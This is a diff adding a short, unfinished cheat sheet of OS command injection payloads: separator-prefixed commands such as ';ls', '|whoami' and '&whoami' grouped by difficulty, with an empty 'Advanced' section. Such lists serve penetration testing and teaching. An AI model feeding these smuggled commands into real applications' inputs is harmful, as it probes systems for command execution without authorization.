@@ -1,0 +1,22 @@
+OS command Injectio:
+====================
+
+Basic injectio:
+===============
+;ls
+;whoami
+&ls
+| ls
+|ls
+
+
+
+Mediium Injection
+=================
+&whoami
+|whoami
+
+
+Advanced Injection
+==================
+
